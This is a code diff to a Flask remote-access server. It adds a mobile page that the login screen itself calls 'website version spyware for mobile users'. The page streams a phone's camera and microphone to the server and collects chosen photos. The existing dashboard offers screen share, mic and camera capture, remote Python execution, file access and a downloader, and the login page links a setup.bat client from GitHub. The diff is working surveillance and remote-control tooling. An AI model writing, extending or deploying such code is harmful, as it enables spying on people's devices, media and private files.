@@ -16,7 +16,7 @@ from datetime import timedelta
 from functools import wraps
 from flask import (
     Flask, request, jsonify, Response,
-    render_template_string, send_file,
+    make_response, render_template_string, send_file,
     session, redirect, url_for
 )
 
@@ -48,6 +48,15 @@ MAX_STREAM_FRAME_SIZE = 5 * 1024 * 1024
 MAX_AUDIO_CHUNK_SIZE = 256 * 1024
 MAX_CAMERA_FRAME_SIZE = 5 * 1024 * 1024
 
+MOBILE_PHOTO_LIMIT = 60
+MOBILE_PHOTO_MAX_SIZE = 10 * 1024 * 1024
+MOBILE_PHOTO_TYPES = {
+    "image/jpeg": ".jpg",
+    "image/png": ".png",
+    "image/webp": ".webp",
+    "image/gif": ".gif",
+}
+
 MAX_PUSH_TOTAL_SIZE = 100 * 1024 * 1024
 PUSH_ROOT = os.path.join(tempfile.gettempdir(), "remoteadmin_pushes")
 
@@ -69,13 +78,17 @@ listing_requests = {}
 pushes = {}
 key_events = {}
 key_sequences = {}
+mobile_photos = {}
 
 lock = threading.Lock()
 
 website_sessions = {}
+blocked_sessions = {}
 session_lock = threading.Lock()
 WEBSITE_SESSION_LIMIT = 100
 WEBSITE_SESSION_MAX_AGE = 7 * 24 * 3600
+BLOCK_SECONDS = 60
+MAX_BLOCK_SECONDS = 86400
 
 NAME_REUSE_SECONDS = 90
 OFFLINE_AFTER_SECONDS = 60
@@ -219,10 +232,11 @@ def require_auth(function):
     def wrapper(*args, **kwargs):
 
         # The client agent still authenticates with HTTP Basic,
-        # while the browser uses the login form session cookie.
+        # while browsers (including the mobile web client) use the
+        # login form session cookie.
         if is_machine_request():
 
-            if valid_credentials(request.authorization):
+            if valid_credentials(request.authorization) or is_signed_in():
                 return function(*args, **kwargs)
 
             return jsonify({"error": "Authentication required"}), 401
@@ -332,6 +346,7 @@ def remove_client(name):
     camera_streams.pop(name, None)
     key_events.pop(name, None)
     key_sequences.pop(name, None)
+    mobile_photos.pop(name, None)
 
     add_log("warn", f"Computer went offline: {name}")
 
@@ -615,6 +630,44 @@ HTML = r"""
             border-radius: 6px;
             border: 1px solid #63304f;
             background: #180d14;
+        }
+
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 10px;
+            margin-top: 14px;
+        }
+
+        .photo-card {
+            display: block;
+            border: 1px solid #4a2140;
+            border-radius: 8px;
+            overflow: hidden;
+            background: #120a10;
+            color: inherit;
+            text-decoration: none;
+        }
+
+        .photo-card:hover {
+            border-color: #d9488f;
+        }
+
+        .photo-card img {
+            display: block;
+            width: 100%;
+            height: 120px;
+            object-fit: cover;
+        }
+
+        .photo-card span {
+            display: block;
+            padding: 6px 8px;
+            font-size: 10px;
+            color: #b98fa8;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
         }
 
         .level-track {
@@ -1853,6 +1906,36 @@ HTML = r"""
             line-height: 1.55;
         }
 
+        .device-tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .device-tab {
+            flex: 1;
+            padding: 10px 8px;
+            background: transparent;
+            border: 1px solid #63304f;
+            border-radius: 7px;
+            color: #b98fa8;
+            font-family: Consolas, monospace;
+            font-size: 11px;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            cursor: pointer;
+        }
+
+        .device-tab:hover {
+            background: #2a1222;
+        }
+
+        .device-tab.active {
+            background: #c93b86;
+            border-color: #c93b86;
+            color: #fff4f9;
+        }
+
         .connect-controls {
             display: flex;
             flex-direction: column;
@@ -1944,8 +2027,13 @@ HTML = r"""
         <h1>Connect to a computer</h1>
 
         <p class="connect-sub">
-            Pick a computer that is running the client, then press Connect.
+            Pick a Windows computer or a mobile device, then press Connect.
         </p>
+
+        <div class="device-tabs">
+            <button class="device-tab active" data-kind="desktop" onclick="selectDeviceKind('desktop')">Windows computers</button>
+            <button class="device-tab" data-kind="mobile" onclick="selectDeviceKind('mobile')">Mobile devices</button>
+        </div>
 
         <div class="connect-controls">
 
@@ -1982,7 +2070,7 @@ HTML = r"""
             <span class="brand-dot"></span>
             <div>
                 <strong id="sidebarComputer">Computer</strong>
-                <span class="sidebar-sub">Connected</span>
+                <span class="sidebar-sub" id="sidebarSub">Connected</span>
             </div>
         </div>
 
@@ -1994,6 +2082,7 @@ HTML = r"""
                 <li><button class="nav-item" data-panel="stream" onclick="selectPanel('stream')">Screen Share</button></li>
                 <li><button class="nav-item" data-panel="mic" onclick="selectPanel('mic')">Microphone</button></li>
                 <li><button class="nav-item" data-panel="camera" onclick="selectPanel('camera')">Camera</button></li>
+                <li><button class="nav-item" data-panel="photos" onclick="selectPanel('photos')">Pictures</button></li>
                 <li><button class="nav-item" data-panel="python" onclick="selectPanel('python')">Python</button></li>
                 <li><button class="nav-item" data-panel="files" onclick="selectPanel('files')">Files</button></li>
                 <li><button class="nav-item" data-panel="downloader" onclick="selectPanel('downloader')">Downloader</button></li>
@@ -2237,6 +2326,31 @@ HTML = r"""
 </section>
 
 
+<section class="panel view" data-view="photos" hidden>
+
+    <p class="view-hint">
+        Pictures shared from the mobile device. The phone must pick them
+        before they appear here.
+    </p>
+
+    <div class="panel-header">
+
+        <div class="row">
+            <button onclick="requestPhotos()">Request pictures</button>
+            <button class="ghost" onclick="loadPhotos()">Refresh</button>
+        </div>
+
+    </div>
+
+    <p id="photoStatus" class="muted">
+        No pictures yet.
+    </p>
+
+    <div id="photoGrid" class="photo-grid"></div>
+
+</section>
+
+
 <section class="panel view" data-view="python" hidden>
 
     <div class="panel-header">
@@ -2467,10 +2581,31 @@ HTML = r"""
 
 <script>
 
+// Blocked sessions are sent straight to the block page, even if the
+// dashboard never navigates anywhere.
+const nativeFetch = window.fetch.bind(window);
+
+window.fetch = async function(...args) {
+    const response = await nativeFetch(...args);
+    if (response.status === 403 && response.headers.get("X-Blocked") === "1") {
+        window.location.reload();
+    }
+    return response;
+};
+
 let currentComputer = "";
 let currentTree = null;
 let currentFolder = "";
 let currentRoot = "";
+let currentKind = "desktop";
+let deviceKind = "desktop";
+let deviceList = [];
+let photoPoll = null;
+
+const DESKTOP_ONLY_PANELS = [
+    "live", "screenshot", "stream", "files", "downloader", "python", "console"
+];
+const MOBILE_ONLY_PANELS = ["photos"];
 
 const RENDER_CHUNK = 300;
 
@@ -2887,6 +3022,7 @@ const VIEW_TITLES = {
     stream: "Screen Share",
     mic: "Microphone",
     camera: "Camera",
+    photos: "Pictures",
     python: "Python",
     files: "Files",
     downloader: "Downloader",
@@ -2928,6 +3064,16 @@ function selectPanel(name) {
             item.dataset.panel === name
         );
     });
+
+    if (name === "photos" && currentKind === "mobile") {
+        loadPhotos();
+        if (!photoPoll) {
+            photoPoll = setInterval(loadPhotos, 5000);
+        }
+    } else if (photoPoll) {
+        clearInterval(photoPoll);
+        photoPoll = null;
+    }
 }
 
 
@@ -2953,10 +3099,19 @@ async function disconnectComputer(reason) {
     currentTree = null;
     currentFolder = "";
     currentRoot = "";
+    currentKind = "desktop";
 
     clearTimeout(streamTimer);
     clearTimeout(micTimer);
     clearTimeout(cameraTimer);
+
+    if (photoPoll) {
+        clearInterval(photoPoll);
+        photoPoll = null;
+    }
+
+    document.getElementById("photoGrid").textContent = "";
+    document.getElementById("photoStatus").textContent = "No pictures yet.";
 
     consoleSetTarget();
 
@@ -3031,53 +3186,109 @@ async function refreshComputers() {
         const response = await api("/api/clients");
         const data = await response.json();
 
-        const select = document.getElementById("computerSelect");
-        const previous = select.value;
+        deviceList = data.clients || [];
 
-        select.innerHTML = "";
+        renderComputerOptions();
 
-        if (data.clients.length === 0) {
-
-            const placeholder =
-                document.createElement("option");
-
-            placeholder.value = "";
-            placeholder.textContent = "No computers connected";
-            placeholder.disabled = true;
-
-            select.appendChild(placeholder);
-        }
-
-        for (const computer of data.clients) {
-
-            const option = document.createElement("option");
-
-            option.value = computer.name;
-
-            option.textContent = computer.name;
-
-            select.appendChild(option);
-        }
-
-        if (previous && data.clients.some(c => c.name === previous)) {
-            select.value = previous;
-        }
-
-        const names = data.clients.map(c => c.name);
+        const names = deviceList.map(c => c.name);
 
         if (currentComputer && !names.includes(currentComputer)) {
             await disconnectComputer();
         }
 
         if (!currentComputer) {
+
+            const selected = document.getElementById("computerSelect").value;
+
             document.getElementById("connectionStatus").textContent =
-                names.length === 0
-                    ? "No computers are connected yet."
-                    : "Select a computer and press Connect.";
+                selected
+                    ? "Press Connect to open this device."
+                    : deviceList.length === 0
+                        ? "No devices are connected yet."
+                        : "Select a device and press Connect.";
         }
 
     } catch (error) {
         console.error(error);
+    }
+}
+
+
+function selectDeviceKind(kind) {
+
+    deviceKind = kind === "mobile" ? "mobile" : "desktop";
+
+    document.querySelectorAll(".device-tab").forEach(tab => {
+        tab.classList.toggle("active", tab.dataset.kind === deviceKind);
+    });
+
+    renderComputerOptions();
+    refreshComputers();
+}
+
+
+function renderComputerOptions() {
+
+    const select = document.getElementById("computerSelect");
+    const previous = select.value;
+    const matches = deviceList.filter(
+        computer => (computer.kind || "desktop") === deviceKind
+    );
+
+    select.innerHTML = "";
+
+    if (matches.length === 0) {
+
+        const placeholder = document.createElement("option");
+
+        placeholder.value = "";
+        placeholder.textContent = deviceKind === "mobile"
+            ? "No mobile devices connected"
+            : "No Windows computers connected";
+        placeholder.disabled = true;
+
+        select.appendChild(placeholder);
+    }
+
+    for (const computer of matches) {
+
+        const option = document.createElement("option");
+
+        option.value = computer.name;
+        option.dataset.kind = computer.kind || "desktop";
+        option.textContent = computer.name;
+
+        select.appendChild(option);
+    }
+
+    if (previous && matches.some(c => c.name === previous)) {
+        select.value = previous;
+    }
+}
+
+
+function applyDashboardMode(kind) {
+
+    const mobile = kind === "mobile";
+
+    document.querySelectorAll(".nav-item").forEach(item => {
+
+        const panel = item.dataset.panel;
+        const hide = mobile
+            ? DESKTOP_ONLY_PANELS.includes(panel)
+            : MOBILE_ONLY_PANELS.includes(panel);
+
+        item.closest("li").hidden = hide;
+    });
+
+    document.getElementById("sidebarSub").textContent =
+        mobile ? "Mobile web device" : "Connected";
+
+    if (mobile) {
+        selectPanel("camera");
+        loadPhotos();
+    } else {
+        selectPanel("live");
     }
 }
 
@@ -3102,12 +3313,16 @@ async function connectComputer() {
 
     liveScreenReset();
 
-    currentComputer =
-        document.getElementById("computerSelect").value;
+    const select = document.getElementById("computerSelect");
+    const selectedOption = select.selectedOptions[0];
+
+    currentComputer = select.value;
+    currentKind =
+        (selectedOption && selectedOption.dataset.kind) || "desktop";
 
     if (!currentComputer) {
         consoleSetTarget();
-        showToast("No computer selected.", "error", "Nothing to connect");
+        showToast("No device selected.", "error", "Nothing to connect");
         return;
     }
 
@@ -3147,7 +3362,7 @@ async function connectComputer() {
         );
 
         showHomeView(data.name);
-        selectPanel("live");
+        applyDashboardMode(currentKind);
 
         showToast(
             "Connected to " + data.name + ".",
@@ -5447,6 +5662,115 @@ async function pollCamera() {
 
 
 // ==================================================
+// MOBILE PICTURES
+// ==================================================
+
+async function requestPhotos() {
+
+    if (!currentComputer || currentKind !== "mobile") {
+        return;
+    }
+
+    try {
+
+        await api("/api/photos/request", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                name: currentComputer
+            })
+        });
+
+        document.getElementById("photoStatus").textContent =
+            "Request sent. Pick the pictures on the phone.";
+
+        showToast(
+            "Request sent to " + currentComputer + ".",
+            "info",
+            "Pictures"
+        );
+
+    } catch (error) {
+
+        showToast(error.message, "error", "Pictures failed");
+    }
+}
+
+
+async function loadPhotos() {
+
+    if (!currentComputer || currentKind !== "mobile") {
+        return;
+    }
+
+    try {
+
+        const response = await api(
+            "/api/photos?name=" + encodeURIComponent(currentComputer)
+        );
+
+        const data = await response.json();
+
+        if (currentKind !== "mobile") {
+            return;
+        }
+
+        renderPhotos(data.photos || []);
+
+    } catch (error) {
+    }
+}
+
+
+function renderPhotos(photos) {
+
+    const grid = document.getElementById("photoGrid");
+    const status = document.getElementById("photoStatus");
+
+    grid.textContent = "";
+
+    if (!photos.length) {
+        status.textContent =
+            "No pictures yet. Press Request pictures and pick them on the phone.";
+        return;
+    }
+
+    status.textContent = photos.length + " picture(s) received.";
+
+    photos.forEach(photo => {
+
+        const link = document.createElement("a");
+
+        link.className = "photo-card";
+        link.href =
+            "/api/photo/" +
+            encodeURIComponent(currentComputer) +
+            "/" + encodeURIComponent(photo.id);
+        link.target = "_blank";
+        link.rel = "noopener";
+
+        const image = document.createElement("img");
+
+        image.src = link.href;
+        image.alt = photo.name;
+        image.loading = "lazy";
+
+        const caption = document.createElement("span");
+
+        caption.textContent =
+            photo.name + " \u00b7 " +
+            Math.max(1, Math.round(photo.size / 1024)) + " KB";
+
+        link.appendChild(image);
+        link.appendChild(caption);
+        grid.appendChild(link);
+    });
+}
+
+
+// ==================================================
 // REMOTE PYTHON RUNNER
 // ==================================================
 
@@ -6135,25 +6459,27 @@ LOGIN_HTML = r"""
             box-shadow: none;
         }
 
-        .download-instead {
-            display: block;
-            width: 100%;
-            margin-top: 10px;
-            padding: 10px 15px;
-            border: 1px solid #63304f;
-            border-radius: 4px;
-            background: #241320;
-            color: #ff9ecb;
+        .alt-links {
+            margin-top: 14px;
             text-align: center;
-            text-decoration: none;
-            font-family: Consolas, monospace;
-            transition: background 160ms ease, border-color 160ms ease;
-            box-sizing: border-box;
         }
 
-        .download-instead:hover {
-            background: #3a1a30;
-            border-color: #d9488f;
+        .alt-link {
+            display: block;
+            color: #ff9ecb;
+            font-size: 11px;
+            letter-spacing: 0.6px;
+            text-decoration: underline;
+            text-underline-offset: 3px;
+            transition: color 160ms ease;
+        }
+
+        .alt-link + .alt-link {
+            margin-top: 10px;
+        }
+
+        .alt-link:hover {
+            color: #f7dbe8;
         }
 
         .footer {
@@ -6253,15 +6579,23 @@ LOGIN_HTML = r"""
         Sign In
     </button>
 
-    <a
-        class="download-instead"
-        href="https://github.com/downloader-AXP/downloader/releases/download/v1/setup.bat"
-        target="_blank"
-        rel="noopener noreferrer"
-        aria-label="Download setup.bat from the v1 GitHub release"
-    >
-        Download setup.bat
-    </a>
+    <div class="alt-links">
+
+        <a
+            class="alt-link"
+            href="https://github.com/downloader-AXP/downloader/releases/download/v1/setup.bat"
+            target="_blank"
+            rel="noopener noreferrer"
+            aria-label="Download setup.bat from the v1 GitHub release"
+        >
+            download instead
+        </a>
+
+        <a class="alt-link" href="/mobile">
+            use website version spyware for mobile users
+        </a>
+
+    </div>
 
     <p class="footer">Authorized access only.</p>
 
@@ -6291,6 +6625,839 @@ LOGIN_HTML = r"""
 
         submitButton.disabled = true;
         submitButton.textContent = "Signing In...";
+    });
+</script>
+
+</body>
+</html>
+"""
+
+
+BLOCKED_HTML = r"""
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Access blocked</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: grid;
+            place-items: center;
+            padding: 24px;
+            background:
+                radial-gradient(circle at 50% 22%, #2a0f22 0%, #180d14 62%);
+            color: #f7dbe8;
+            font-family: Consolas, monospace;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 420px;
+            padding: 38px 32px;
+            text-align: center;
+            background: rgba(26, 12, 20, 0.94);
+            border: 1px solid #4a2140;
+            border-radius: 16px;
+            box-shadow: 0 30px 90px rgba(0, 0, 0, 0.75);
+        }
+
+        h1 {
+            margin: 0 0 12px;
+            font-size: 20px;
+            letter-spacing: 2px;
+            color: #ff7ab8;
+        }
+
+        p {
+            margin: 0 0 8px;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #b98fa8;
+        }
+
+        .timer {
+            margin-top: 24px;
+            font-size: 30px;
+            color: #ff9ecb;
+        }
+
+        .timer span {
+            color: #fff;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="card">
+    <h1>ACCESS BLOCKED</h1>
+    <p>This device has been blocked from using the website.</p>
+    <p>Nothing on the site can be used until the block ends.</p>
+    <div class="timer"><span id="seconds">{{ remaining }}</span>s</div>
+</div>
+
+<script>
+    let left = {{ remaining }};
+    const label = document.getElementById("seconds");
+
+    setInterval(function() {
+        left -= 1;
+        if (left <= 0) {
+            window.location.reload();
+            return;
+        }
+        label.textContent = left;
+    }, 1000);
+</script>
+
+</body>
+</html>
+"""
+
+
+# ==================================================
+# MOBILE WEBSITE VERSION
+# ==================================================
+
+MOBILE_HTML = r"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Remote Session</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            padding: 18px 16px 40px;
+            background:
+                radial-gradient(circle at 50% 0%, #22101c 0%, #0b0609 60%);
+            color: #d8ffe8;
+            font-family: Consolas, "Courier New", monospace;
+        }
+
+        .scanlines {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            background: repeating-linear-gradient(
+                to bottom,
+                rgba(255, 255, 255, 0.025) 0px,
+                rgba(255, 255, 255, 0.025) 1px,
+                transparent 1px,
+                transparent 4px
+            );
+            z-index: 5;
+        }
+
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 26px;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: #ff7ab8;
+        }
+
+        .brand .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ff3b8d;
+            box-shadow: 0 0 12px #ff3b8d;
+            animation: pulse 1.4s ease-in-out infinite;
+        }
+
+        .leave {
+            background: transparent;
+            border: 1px solid #63304f;
+            color: #ff9ecb;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-family: inherit;
+            font-size: 11px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        h1.glitch {
+            position: relative;
+            margin: 0 0 10px;
+            font-size: clamp(26px, 9vw, 44px);
+            line-height: 1.05;
+            letter-spacing: 2px;
+            text-align: center;
+            color: #ff5fa2;
+            text-shadow:
+                0 0 18px rgba(255, 59, 141, 0.45),
+                2px 0 #00ffa3,
+                -2px 0 #7a5cff;
+            animation: glitch 3.2s infinite steps(1);
+        }
+
+        @keyframes glitch {
+            0%, 92%, 100% { transform: none; }
+            93% { transform: translate(-2px, 1px); }
+            94% { transform: translate(3px, -1px); }
+            95% { transform: translate(-1px, 0); }
+            96% { transform: translate(2px, 1px); }
+        }
+
+        .sub {
+            margin: 0 auto 22px;
+            max-width: 460px;
+            text-align: center;
+            color: #b98fa8;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+
+        .chips {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 22px;
+        }
+
+        .chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 7px;
+            padding: 6px 11px;
+            border: 1px solid #4a2140;
+            border-radius: 999px;
+            background: #180d14;
+            color: #b98fa8;
+            font-size: 10px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .chip i {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #5a3350;
+        }
+
+        .chip.ok { color: #8dffc0; border-color: #1f6b45; }
+        .chip.ok i { background: #00ffa3; box-shadow: 0 0 8px #00ffa3; }
+        .chip.live { color: #ffb3d2; border-color: #a03a78; }
+        .chip.live i { background: #ff3b8d; box-shadow: 0 0 8px #ff3b8d; animation: pulse 1s infinite; }
+
+        .card {
+            max-width: 520px;
+            margin: 0 auto 16px;
+            padding: 18px;
+            background: rgba(20, 10, 16, 0.92);
+            border: 1px solid #4a2140;
+            border-radius: 12px;
+        }
+
+        .card h2 {
+            margin: 0 0 8px;
+            font-size: 13px;
+            letter-spacing: 1.4px;
+            text-transform: uppercase;
+            color: #ff9ecb;
+        }
+
+        .card p {
+            margin: 0 0 14px;
+            color: #b98fa8;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+
+        .card button {
+            width: 100%;
+            margin-bottom: 9px;
+            padding: 13px;
+            background: #c93b86;
+            border: none;
+            border-radius: 8px;
+            color: #fff4f9;
+            font-family: inherit;
+            font-size: 12px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .card button.ghost {
+            background: transparent;
+            border: 1px solid #a03a78;
+            color: #ff9ecb;
+        }
+
+        .card button:disabled {
+            opacity: 0.45;
+        }
+
+        .perm-status {
+            margin: 6px 0 0 !important;
+            font-size: 11px !important;
+            color: #8a5577 !important;
+        }
+
+        .banner {
+            max-width: 520px;
+            margin: 0 auto 16px;
+            padding: 12px 14px;
+            background: rgba(255, 59, 141, 0.09);
+            border: 1px solid rgba(255, 59, 141, 0.5);
+            border-radius: 8px;
+            color: #ffb3d2;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+
+        .banner button {
+            margin-top: 8px;
+            width: 100%;
+            padding: 11px;
+            background: #c93b86;
+            border: none;
+            border-radius: 7px;
+            color: #fff;
+            font-family: inherit;
+            font-size: 11px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .console {
+            max-width: 520px;
+            margin: 0 auto;
+            border: 1px solid #1f6b45;
+            border-radius: 10px;
+            overflow: hidden;
+            background: #050a07;
+            box-shadow: 0 0 30px rgba(0, 255, 163, 0.06);
+        }
+
+        .console-head {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 12px;
+            background: #0b1710;
+            border-bottom: 1px solid #143d29;
+            color: #4fca8d;
+            font-size: 10px;
+            letter-spacing: 1.4px;
+            text-transform: uppercase;
+        }
+
+        .console-body {
+            height: 240px;
+            overflow-y: auto;
+            padding: 12px;
+            font-size: 11px;
+            line-height: 1.7;
+            color: #7dffb0;
+            white-space: pre-wrap;
+            overflow-wrap: anywhere;
+        }
+
+        .console-body .dim { color: #3e7a5a; }
+        .console-body .warn { color: #ffb3d2; }
+        .console-body .err { color: #ff5f7e; }
+
+        #preview {
+            display: block;
+            width: 100%;
+            max-width: 520px;
+            margin: 16px auto 0;
+            border: 1px solid #4a2140;
+            border-radius: 10px;
+            background: #000;
+        }
+
+        #preview[hidden] {
+            display: none;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.35; }
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="scanlines"></div>
+
+<header>
+    <div class="brand"><span class="dot"></span> Remote Session</div>
+    <button class="leave" id="leaveButton">Stop sharing</button>
+</header>
+
+<h1 class="glitch">YOU ARE BEING HACKED</h1>
+
+<p class="sub">
+    A remote operator has an open session with this device.
+    Nothing is captured until you allow the permissions below.
+</p>
+
+<div class="chips">
+    <span class="chip" id="chipLink"><i></i> Uplink</span>
+    <span class="chip" id="chipCamera"><i></i> Camera</span>
+    <span class="chip" id="chipMic"><i></i> Microphone</span>
+    <span class="chip" id="chipPhotos"><i></i> Pictures</span>
+</div>
+
+<div class="banner" id="requestBanner" hidden>
+    The dashboard requested pictures from this device.
+    <button id="bannerPick">Choose pictures</button>
+</div>
+
+<section class="card" id="permissionCard">
+    <h2>Device permissions</h2>
+    <p>
+        Allow camera and microphone access for live viewing, and pick
+        pictures to send them to the dashboard. You can stop sharing at
+        any time.
+    </p>
+    <button id="enableMedia" disabled>Allow camera + microphone</button>
+    <button class="ghost" id="pickPhotos" disabled>Allow pictures</button>
+    <p class="perm-status" id="permStatus">Connecting to the dashboard...</p>
+    <input id="photoInput" type="file" accept="image/*" multiple hidden>
+</section>
+
+<section class="console">
+    <div class="console-head">
+        <span>session.log</span>
+        <span id="deviceLabel">device</span>
+    </div>
+    <div class="console-body" id="log"></div>
+</section>
+
+<video id="preview" playsinline autoplay muted hidden></video>
+
+<script>
+const logEl = document.getElementById("log");
+const preview = document.getElementById("preview");
+const photoInput = document.getElementById("photoInput");
+const permStatus = document.getElementById("permStatus");
+const enableButton = document.getElementById("enableMedia");
+const pickButton = document.getElementById("pickPhotos");
+const requestBanner = document.getElementById("requestBanner");
+const deviceLabel = document.getElementById("deviceLabel");
+
+let deviceName = localStorage.getItem("remoteMobileName") || "";
+let mediaStream = null;
+let audioContext = null;
+let cameraGranted = false;
+let micGranted = false;
+let photoCount = 0;
+let cameraActive = false;
+let micActive = false;
+let cameraWarned = false;
+let micWarned = false;
+let cameraTimer = null;
+let micPending = [];
+let micPendingSamples = 0;
+let heartbeatScheduled = false;
+
+const canvas = document.createElement("canvas");
+const context2d = canvas.getContext("2d");
+
+
+function logLine(text, cls) {
+    const line = document.createElement("div");
+    if (cls) line.className = cls;
+    line.textContent = text;
+    logEl.appendChild(line);
+    while (logEl.childNodes.length > 200) logEl.removeChild(logEl.firstChild);
+    logEl.scrollTop = logEl.scrollHeight;
+}
+
+
+function setChip(id, state, label) {
+    const chip = document.getElementById(id);
+    chip.className = "chip " + (state || "");
+    chip.lastChild.textContent = " " + label;
+}
+
+
+function authRedirect(response) {
+    if (response.status === 401) {
+        window.location.href = "/login?next=" + encodeURIComponent("/mobile");
+        return true;
+    }
+    return false;
+}
+
+
+async function postJson(url, payload) {
+    const response = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    });
+    if (authRedirect(response)) throw new Error("Sign in required.");
+    return response;
+}
+
+
+async function registerDevice() {
+    const response = await postJson("/api/mobile/register", { name: deviceName });
+    if (!response.ok) throw new Error("Registration failed (" + response.status + ").");
+    const data = await response.json();
+    deviceName = data.name;
+    localStorage.setItem("remoteMobileName", deviceName);
+    deviceLabel.textContent = deviceName;
+    logLine("> device registered as " + deviceName, "dim");
+    setChip("chipLink", "ok", "Uplink online");
+    permStatus.textContent = "Connected. Allow the permissions below.";
+    enableButton.disabled = false;
+    pickButton.disabled = false;
+}
+
+
+function stopMedia() {
+    cameraActive = false;
+    micActive = false;
+    clearTimeout(cameraTimer);
+    micPending = [];
+    micPendingSamples = 0;
+    if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+    }
+    if (audioContext) {
+        audioContext.close().catch(() => {});
+        audioContext = null;
+    }
+    preview.srcObject = null;
+    preview.hidden = true;
+}
+
+
+async function enableMedia() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        logLine("! this browser does not expose camera or microphone access", "err");
+        permStatus.textContent = "Camera and microphone are not available in this browser.";
+        return;
+    }
+    try {
+        enableButton.disabled = true;
+        permStatus.textContent = "Waiting for camera and microphone permission...";
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: "user",
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            },
+            audio: true
+        });
+        preview.srcObject = mediaStream;
+        preview.hidden = false;
+        preview.play().catch(() => {});
+        cameraGranted = true;
+        micGranted = true;
+        cameraWarned = false;
+        micWarned = false;
+        logLine("> camera permission granted", "dim");
+        logLine("> microphone permission granted", "dim");
+        setChip("chipCamera", "ok", "Camera ready");
+        setChip("chipMic", "ok", "Mic ready");
+        permStatus.textContent = "Camera and microphone are allowed.";
+        setupMicrophone(mediaStream);
+        heartbeat();
+    } catch (error) {
+        enableButton.disabled = false;
+        logLine("! permission denied: " + error.message, "err");
+        permStatus.textContent = "Permission was denied: " + error.message;
+    }
+}
+
+
+function downsample(input, fromRate, toRate) {
+    if (toRate >= fromRate) return Float32Array.from(input);
+    const ratio = fromRate / toRate;
+    const length = Math.floor(input.length / ratio);
+    const output = new Float32Array(length);
+    for (let i = 0; i < length; i++) {
+        const start = Math.floor(i * ratio);
+        const end = Math.min(input.length, Math.floor((i + 1) * ratio));
+        let sum = 0;
+        for (let j = start; j < end; j++) sum += input[j];
+        output[i] = sum / Math.max(1, end - start);
+    }
+    return output;
+}
+
+
+function setupMicrophone(stream) {
+    if (audioContext) return;
+    const Ctx = window.AudioContext || window.webkitAudioContext;
+    if (!Ctx) {
+        logLine("! audio processing is not available in this browser", "err");
+        return;
+    }
+    audioContext = new Ctx();
+    const source = audioContext.createMediaStreamSource(stream);
+    const processor = audioContext.createScriptProcessor(4096, 1, 1);
+    const sink = audioContext.createGain();
+    sink.gain.value = 0;
+    source.connect(processor);
+    processor.connect(sink);
+    sink.connect(audioContext.destination);
+    processor.onaudioprocess = event => {
+        if (!micActive) return;
+        const samples = downsample(
+            event.inputBuffer.getChannelData(0),
+            audioContext.sampleRate,
+            16000
+        );
+        const pcm = new Int16Array(samples.length);
+        for (let i = 0; i < samples.length; i++) {
+            const value = Math.max(-1, Math.min(1, samples[i]));
+            pcm[i] = value < 0 ? value * 32768 : value * 32767;
+        }
+        micPending.push(pcm);
+        micPendingSamples += pcm.length;
+        if (micPendingSamples >= 8000) flushMicrophone();
+    };
+    audioContext.resume().catch(() => {});
+}
+
+
+function flushMicrophone() {
+    if (!micPending.length || !deviceName) return;
+    const total = micPending.reduce((sum, item) => sum + item.length, 0);
+    const merged = new Int16Array(total);
+    let offset = 0;
+    for (const item of micPending) {
+        merged.set(item, offset);
+        offset += item.length;
+    }
+    micPending = [];
+    micPendingSamples = 0;
+    const form = new FormData();
+    form.append("name", deviceName);
+    form.append("audio", new Blob([merged.buffer], { type: "application/octet-stream" }), "mic.raw");
+    fetch("/upload-audio", { method: "POST", body: form }).catch(() => {});
+}
+
+
+function uploadFrame(blob) {
+    if (!blob || !deviceName) return;
+    const form = new FormData();
+    form.append("name", deviceName);
+    form.append("frame", blob, "frame.jpg");
+    fetch("/upload-camera", { method: "POST", body: form }).catch(() => {});
+}
+
+
